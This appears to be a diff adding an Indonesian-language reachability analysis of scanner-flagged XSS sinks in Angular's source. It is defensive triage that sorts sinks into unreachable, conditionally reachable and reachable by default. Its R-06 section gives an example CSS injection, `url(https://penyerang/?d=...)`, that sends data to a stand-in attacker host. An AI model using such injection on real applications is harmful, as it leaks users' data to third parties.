@@ -1,0 +1,215 @@
+ANALISIS KETERJANGKAUAN (REACHABILITY) SINK
+Lanjutan dari: analysis/SINK-TRIAGE.txt
+Tujuan      : menurunkan false positive dengan menanyakan pertanyaan yang lebih
+              tajam daripada "apakah ini sink?" yaitu "APAKAH TAINT BISA SAMPAI
+              KE SINI pada aplikasi nyata?"
+==============================================================================
+
+MENGAPA TRIASE SAJA BELUM CUKUP
+-------------------------------
+Triase mengelompokkan temuan berdasarkan SIFAT kodenya (positif palsu, tidak
+terkirim, berguard, berkontrak). Keterjangkauan menanyakan hal berbeda: sebuah
+sink yang nyata dan terkirim pun tidak berarti apa-apa bila:
+  - kodenya tidak pernah masuk ke bundel aplikasi (BUNDLE GATE), atau
+  - jalurnya hanya aktif di bawah konfigurasi tertentu (EXECUTION GATE), atau
+  - tidak ada sumber tidak-tepercaya yang bisa mencapainya (SOURCE GATE).
+
+Setiap sink di bawah diuji terhadap tiga gerbang itu, dengan bukti kode.
+
+  TIDAK-TERCAPAI       tidak ada jalur pada aplikasi produksi baku
+  TERCAPAI-BERSYARAT   ada jalur, tetapi butuh opt-in eksplisit pengembang
+  TERCAPAI             ada jalur pada konfigurasi baku
+
+==============================================================================
+R-01  JIT eval / new Function        ->  TIDAK-TERCAPAI (produksi AOT)
+==============================================================================
+  Sink : packages/compiler/src/output/output_jit_trusted_types.ts:109,125,131
+
+  BUNDLE GATE (diverifikasi, bukan asumsi):
+    Sink hanya dicapai lewat CompilerFacade. Runtime mengambilnya di
+    packages/core/src/compiler/compiler_facade.ts:23
+        const globalNg = global['ng'];
+        if (globalNg && globalNg.ɵcompilerFacade) return globalNg.ɵcompilerFacade;
+    Properti itu HANYA diisi oleh publishFacade(global) yang dipanggil di baris
+    terakhir packages/compiler/src/compiler.ts:284. Artinya facade ada HANYA
+    bila `@angular/compiler` benar-benar ter-import ke dalam bundel.
+
+    Bila tidak ada, jalurnya bukan "diam-diam tidak tersanitasi" melainkan
+    MELEMPAR (compiler_facade.ts:46-56) dengan pesan yang menyarankan AOT.
+    Jadi kegagalannya bersifat fail-closed.
+
+  KESIMPULAN: pada aplikasi produksi AOT (bawaan Angular CLI), `@angular/compiler`
+  tidak ikut ter-bundle, sehingga sink ini TIDAK ADA di dalam artefak yang
+  dikirim ke peramban. Menghitungnya sebagai temuan pada aplikasi produksi
+  adalah false positive.
+
+  TETAP RELEVAN untuk: aplikasi yang sengaja memakai platform-browser-dynamic,
+  menjalankan TestBed, atau meng-import '@angular/compiler' manual.
+
+==============================================================================
+R-02  @angular/upgrade innerHTML     ->  TERCAPAI-BERSYARAT
+==============================================================================
+  Sink : packages/upgrade/src/common/src/upgrade_helper.ts:254
+
+  BUNDLE GATE  : paket `@angular/upgrade` harus dipasang dan di-import. Paket ini
+                 khusus interop AngularJS; aplikasi Angular murni tidak memuatnya.
+  EXECUTION GATE: harus ada komponen AngularJS yang di-upgrade (UpgradeComponent
+                 atau downgradeComponent).
+  SOURCE GATE  : nilainya adalah `directive.template` atau isi `templateUrl`
+                 yang diambil lewat $http/$templateCache
+                 (upgrade_helper.ts:96-121).
+
+  KESIMPULAN: TERCAPAI bila aplikasi hybrid memuat template dari sumber yang
+  bisa dipengaruhi penyerang (mis. templateUrl ke host pihak ketiga, atau
+  template yang dirakit dari data). Untuk aplikasi Angular non-hybrid:
+  TIDAK-TERCAPAI karena paketnya tidak ada di bundel.
+
+==============================================================================
+R-03  JSONP script.src               ->  TERCAPAI-BERSYARAT
+==============================================================================
+  Sink : packages/common/http/src/jsonp.ts:167-168
+
+  EXECUTION GATE (diverifikasi):
+    JsonpClientBackend hanya terdaftar lewat opt-in eksplisit:
+      packages/common/http/src/provider.ts:245  withJsonpSupport()
+      packages/common/http/src/module.ts:119    HttpClientJsonpModule
+    Tanpa salah satunya, permintaan JSONP tidak punya backend.
+
+  KESIMPULAN: TIDAK-TERCAPAI pada konfigurasi HttpClient baku. TERCAPAI bila
+  pengembang menambahkan withJsonpSupport() - dan pada saat itu keamanannya
+  memang bergantung penuh pada kepercayaan terhadap host tujuan, sesuai sifat
+  JSONP.
+
+==============================================================================
+R-04  Service Worker openWindow/navigate/fetch  ->  TERCAPAI-BERSYARAT
+==============================================================================
+  Sink : packages/service-worker/worker/src/driver.ts:444,451,458,461,466
+
+  BUNDLE GATE   : service worker Angular harus diaktifkan
+                  (provideServiceWorker / ServiceWorkerModule.register).
+  EXECUTION GATE: pengguna harus mengizinkan notifikasi, aplikasi harus
+                  berlangganan push, dan payload push harus memuat
+                  `data.onActionClick[<action>]` dengan `operation` yang dikenal.
+  SOURCE GATE   : payload push hanya dapat dikirim pihak yang memegang kunci
+                  VAPID aplikasi - praktisnya backend aplikasi sendiri.
+
+  MITIGASI: urlToOpen = new URL(url ?? '', registration.scope).href
+            URL relatif dijamin same-origin. URL ABSOLUT tetap menang.
+
+  KESIMPULAN: TERCAPAI-BERSYARAT dengan rantai prasyarat yang panjang. Bukan
+  celah framework; namun backend push yang disusupi dapat mengarahkan klik
+  notifikasi ke origin mana pun, dan `sendRequest` melakukan fetch dari dalam
+  Service Worker. Layak dicantumkan dalam model ancaman aplikasi yang memakai
+  push notification.
+
+==============================================================================
+R-05  <link rel=stylesheet href>     ->  TIDAK-TERCAPAI dari sumber runtime
+==============================================================================
+  Sink : packages/platform-browser/src/dom/shared_styles_host.ts:103
+
+  SOURCE GATE (diverifikasi dengan menelusuri pemanggil):
+    createLinkElement dipanggil dari tiga tempat, seluruhnya menerima URL dari
+    definisi komponen hasil kompilasi:
+      dom_renderer.ts:598        component.getExternalStyles?.()
+      shared_styles_host.ts:144  daftar `urls` dari definisi komponen
+      shared_styles_host.ts:219  idem, untuk host node
+    `getExternalStyles` adalah fungsi yang DIHASILKAN COMPILER dari `styleUrls`.
+    Tidak ada API publik yang menyuntikkan URL ini saat runtime.
+
+  KESIMPULAN: tidak ada jalur dari data runtime. Menjadi masalah hanya bila
+  artefak build sudah dikompromikan - dan pada titik itu penyerang sudah
+  mengendalikan seluruh bundel.
+
+==============================================================================
+R-06  Binding style                  ->  TERCAPAI (dengan koreksi penting)
+==============================================================================
+  Ini kasus yang paling menarik, dan penilaian saya sebelumnya terlalu kasar.
+  Ternyata ADA DUA JALUR BERBEDA untuk "style", dengan nasib berbeda:
+
+  (a) [attr.style]="evil"   ->  DISANITASI
+      Bukti empiris dari berkas ekspektasi kompilasi:
+        packages/compiler-cli/test/compliance/test_cases/
+          r3_view_compiler_bindings/property_bindings/sanitization.js:8
+            ɵɵattribute("style", ctx.evil, ɵɵsanitizeStyle);
+          .../host_bindings/sanitization.js:4  (bentuk host binding, sama)
+      Jadi `ɵɵsanitizeStyle` BUKAN kode mati - ia dipakai untuk bentuk atribut.
+
+  (b) [style.background]="evil" dan [style]="evil"  ->  TIDAK DISANITASI
+      Dikompilasi menjadi ɵɵstyleProp / ɵɵstyleMap yang memang tidak menerima
+      parameter SanitizerFn sama sekali (subsistem 14).
+
+  MENGAPA (b) TETAP TIDAK MENJADI XSS:
+      applyStyling (node_manipulation.ts:1110) menulis SATU properti lewat
+      `renderer.setStyle(node, prop, value)`. Peramban mem-parse nilai dalam
+      konteks properti itu saja dan membuang yang tidak valid, sehingga nilai
+      tidak bisa memekar menjadi deklarasi tambahan.
+
+  KESIMPULAN: TERCAPAI, dan memang disengaja. Dampak yang mungkin adalah
+  INJEKSI CSS satu-properti (mis. `[style.background]` diisi
+  `url(https://penyerang/?d=...)` untuk eksfiltrasi lewat permintaan gambar),
+  bukan eksekusi skrip. Ini fakta yang perlu diketahui pemakai, bukan cacat.
+
+==============================================================================
+R-07  NgOptimizedImage ngSrc         ->  TERCAPAI
+==============================================================================
+  Sink : setHostAttribute -> renderer.setAttribute(img, 'src'|'srcset', ...)
+
+  SOURCE GATE : `ngSrc` adalah input komponen biasa, jadi data runtime bisa
+                mencapainya secara langsung.
+  GUARD YANG ADA: penolakan `data:` (assertNotBase64Image) dan `blob:`
+                (assertNotBlobUrl) - keduanya HANYA di ngDevMode.
+  KESIMPULAN: TERCAPAI. Dampaknya bukan XSS (memuat gambar tidak mengeksekusi
+  kode) melainkan permintaan jaringan ke host arbitrer: kebocoran Referer,
+  pelacakan, atau SSRF pada sisi loader bila loader meneruskan URL ke server.
+  Perlu dicatat: karena guard-nya dev-only, di produksi `data:`/`blob:` tidak
+  ditolak - namun keduanya juga tidak berbahaya untuk `img`.
+
+==============================================================================
+R-08  schematics new Function        ->  TIDAK-TERCAPAI dari peramban
+==============================================================================
+  packages/core/schematics/utils/load_esm.ts:25 berjalan di Node saat
+  `ng update`. Tidak pernah dikirim ke peramban. Sumbernya jalur modul dari
+  perkakas, bukan data pengguna.
+
+==============================================================================
+R-09  document.write / insertAdjacentHTML / createContextualFragment
+==============================================================================
+  0 kecocokan di seluruh repositori. Tidak ada yang perlu dinilai.
+
+==============================================================================
+DAMPAK TERHADAP JUMLAH TEMUAN
+==============================================================================
+Menerapkan gerbang keterjangkauan pada aplikasi Angular PRODUKSI BAKU
+(AOT, tanpa @angular/upgrade, tanpa withJsonpSupport, tanpa service worker):
+
+  Kandidat awal dari pemindai                       ~360
+  - dikeluarkan sebagai kode tidak terkirim         ~190   (T-06 dkk)
+  - dikeluarkan sebagai positif palsu pola/konteks   ~60   (FP-A..FP-F)
+  - dikeluarkan karena BUNDLE/EXECUTION GATE          R-01, R-02, R-03,
+                                                      R-04, R-08
+  - dikeluarkan karena SOURCE GATE                    R-05
+  ------------------------------------------------------------------
+  Tersisa benar-benar terjangkau pada konfigurasi baku:
+      R-06  injeksi CSS satu-properti lewat [style.x]        (bukan XSS)
+      R-07  permintaan jaringan arbitrer lewat ngSrc         (bukan XSS)
+
+  Keduanya adalah PERILAKU YANG DIRANCANG, bukan cacat - tetapi keduanya nyata
+  dan patut masuk model ancaman aplikasi.
+
+==============================================================================
+CATATAN METODE
+==============================================================================
+Keterjangkauan di sini ditentukan dengan menelusuri pemanggil secara manual
+sampai bertemu gerbang yang bisa diverifikasi di kode (properti global yang
+harus diisi, provider yang harus didaftarkan, fungsi yang harus dihasilkan
+compiler). Ini BUKAN analisis aliran data otomatis: ia tidak melacak nilai
+melewati alias, penyimpanan sementara, atau batas asinkron.
+
+Yang membuat kesimpulan di atas cukup kuat adalah bentuk gerbangnya - semuanya
+biner dan mudah diperiksa ulang:
+    ada/tidaknya `global['ng'].ɵcompilerFacade`   (R-01)
+    ada/tidaknya paket di dependencies            (R-02)
+    ada/tidaknya provider                         (R-03, R-04)
+    asal nilai dari fungsi bikinan compiler       (R-05)
+Bila salah satu gerbang berubah di versi mendatang, kesimpulannya harus dihitung
+ulang - itulah sebabnya setiap gerbang dicatat beserta file:line-nya.
